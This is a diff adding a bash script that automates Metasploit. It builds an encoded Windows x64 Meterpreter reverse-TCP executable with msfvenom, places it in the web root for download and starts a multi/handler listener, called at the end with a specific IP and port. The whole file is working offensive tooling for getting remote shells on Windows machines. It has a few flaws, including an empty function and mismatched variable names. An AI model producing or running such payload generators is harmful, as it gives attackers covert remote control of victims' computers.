@@ -1,0 +1,102 @@
+winx64metrev_tcp_inline() {
+  # Makes an Inline Windows Meterpreter Reverse Payload
+  # enables UUID Tracking (whitelisting) for payloads, ignores the rest
+  # raw payload, no template version
+  setstaticvars() {
+    if [ -z $msfc ]; then `# setting the msfconsole variable`
+      msfc=`locate msfconsole | grep metasploit`
+    fi
+    if [ -z $msfv ]; then `# setting the msfvenom variable`
+      msfv=`locate msfvenom | grep metasploit`
+    fi
+    if [ -z $msfs ]; then `# setting the metasploit scripts dir variable`
+      msfs=`echo $msfc | sed -r 's/(.*)msfconsole/\1scripts/g'`
+    fi
+    if [ -z $webdir ]; then `# setting the web directory variable`
+      webdir="/var/www/html/"
+    fi
+    if [ -z "`grep makeXtermLog /${USER}/.bashrc`" ]; then 
+      `# if the function makeXtermLog is not in the users /.bashrc file`
+      echo "No makeXtermLog function found in users bashrc file"
+    fi
+  }
+  setstaticvars
+  getsysargs() {
+    if [ ! -z $1 ]; then
+      lhost=$1
+    else
+      echo "This is where you enter the listener IP address"
+    fi
+    if [ ! -z $2 ]; then
+      lport=$2
+    else
+      echo "This is where you enter the listener port number"
+    fi
+    if [ ! -z $3 ]; then
+      p_name=$3
+    else
+      p_name="Winx64MetRevTCPInline_$lport"
+    fi
+  }
+  getsysargs $1 $2 $3
+  setpayvars() {
+    d_payload="-p windows/x64/meterpreter_reverse_tcp"
+    d_lhost="set lhost=$lhost"
+    d_lport="set lport=$lport"
+    d_encode="-e x86/shikata_ga_nai -i 10"
+    d_nop="-n 100"
+    d_format="-f exe"
+    d_small="--smallest"
+    d_ignore="IgnoreUnknownPayloads=true"
+    d_uuid="PayloadUUIDName=$pname"
+    d_track="PayloadUUIDTracking=true"
+    d_work="WORKSPACE "
+  }
+  setpayvars
+  paygen() {
+    paydirt=`echo \
+      $d_payload \
+      $d_lhost \
+      $d_lport \
+      $d_encode \
+      $d_nop \
+      $d_format \
+      $d_small \
+      $d_ignore \
+      $d_uuid \
+      $d_track`
+    $msfv $paydirt > $webdir$p_name
+  }
+  paygen
+  sethandlervars() {
+    d_use="use exploit/multi/handler"
+    d_payload="set payload `echo $d_payload | cut -d ' ' -f2`"
+    d_dishandler="set DisablePayloadHandler true"
+    d_lhost="set lhost 0.0.0.0"
+    d_lport="set lport $lport"
+    d_ignore="set IgnoreUnknownPayloads true"
+    d_uuid="set PayloadUUIDName $p_name"
+    d_track="set PayloadUUIDTracking true"
+    d_work="WORKSPACE "
+    d_exit="set existonsession false"
+    rcfile="$msfs/`echo $p_name`_handler.rc"
+  }
+  sethandlervars
+  rcgen() {
+    echo $d_use > $rcfile
+    echo $d_payload >> $rcfile
+    echo $d_lport >> $rcfile
+    echo $d_lhost >> $rcfile
+    echo $d_ignore >> $rcfile
+    echo $d_uuid >> $rcfile
+    echo $d_track >> $rcfile
+    echo $d_exit >> $rcfile
+    echo exploit -j -z >> $rcfile
+  }
+  rcgen
+  autorungen() {
+  
+  }
+  (makeXtermLog "Meterpreter_Handler_$p_name" "$msfc -r $rcfile") &
+}
+winx64metrev_tcp_inline 192.168.100.118 4443
